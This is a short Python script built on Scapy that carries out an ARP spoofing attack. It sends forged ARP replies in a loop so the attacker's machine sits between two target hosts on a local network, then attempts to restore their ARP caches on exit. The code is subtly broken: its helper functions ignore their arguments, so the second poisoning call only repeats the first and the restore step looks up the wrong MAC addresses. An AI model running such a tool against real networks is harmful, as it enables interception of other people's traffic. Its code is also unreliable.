#!/usr/bin/env python3

#Import Scapy
from scapy.all import *
import time
import argparse

L2Broadcast = "FF:FF:FF:FF:FF:FF"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t1", dest="target1", type=str, required=True, help="Choose first target")
    parser.add_argument("-t2", dest="target2", type=str, required=True, help="Choose second target")
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface")
    args = parser.parse_args()

    return args

args = get_arguments()


def get_mac(target1, interface):
    arp_frame = ARP(pdst = args.target1)
    broadcast = Ether(dst = L2Broadcast)
    arp_frame_broadcast = broadcast / arp_frame
    answered = srp(arp_frame_broadcast, iface=args.interface, timeout=2, verbose=0)[0]
 
    return answered[0][1].hwsrc
    
  
def poison(target1, target2, interface):
    packet = ARP(op = 2, pdst = args.target1, hwdst = get_mac(args.target1, interface), psrc = args.target2)
    send(packet, iface=args.interface, verbose=0)
  

def restore(target1, target2, interface):
    target_mac = get_mac(target1, interface)
    gateway_mac = get_mac(target2, interface)
    arp_restore_frame = ARP(pdst=target1, hwdst=target_mac, psrc=target2, hwsrc=gateway_mac)
    send(arp_restore_frame, iface=args.interface, verbose=0, count=5)
      
try:
    packets_count = 0
    while True:
        poison(args.target1, args.target2, args.interface)
        poison(args.target2, args.target1, args.interface)
        packets_count = packets_count + 2
        print("\r[*] Packets Sent " + str(packets_count), end ="")  
        time.sleep(2) 
  
except KeyboardInterrupt:
    print("\nDetected CTRL + C. Exiting.")
    restore(args.target1, args.target2, args.interface)
    restore(args.target2, args.target1, args.interface)
    print ("ARP Spoofing stopped")
